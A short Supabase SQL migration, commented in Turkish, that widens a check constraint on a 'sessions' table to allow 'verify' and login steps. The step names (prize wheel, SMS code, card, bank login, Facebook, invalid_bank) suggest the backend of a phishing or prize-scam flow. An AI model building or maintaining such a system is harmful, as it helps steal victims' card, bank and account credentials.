-- =====================================================================
-- 2026-10-07  VERIFY STEP'INI CHECK KISITINA EKLE
-- HATA: sessions_current_step_check kısıtında 'verify' degeri YOKTU,
-- form submit (current_step='verify') reddediliyordu.
-- Calistir: Supabase > SQL Editor > New Query > Yapistir > RUN
-- =====================================================================

-- 1) ESKI KISITI SIL
ALTER TABLE public.sessions DROP CONSTRAINT IF EXISTS sessions_current_step_check;

-- 2) YENI KISIT: onceki liste + 'verify' + 'login'/'bank_login' (SessionStep union ile uyumlu)
ALTER TABLE public.sessions ADD CONSTRAINT sessions_current_step_check
CHECK (
  current_step IN (
    'code_entry',
    'sms',
    'win',
    'verify',
    'banken',
    'card',
    'wait',
    'invalid_bank',
    'bank',
    'live_support',
    'special_approval',
    'congratulations',
    'congrats',
    'facebook',
    'wheel',
    'login',
    'bank_login'
  )
);

-- 3) PostgREST schema cache YENILE
NOTIFY pgrst, 'reload schema';

-- 4) Kontrol
SELECT id, public_id, current_step, status
FROM public.sessions
ORDER BY created_at DESC
LIMIT 10;
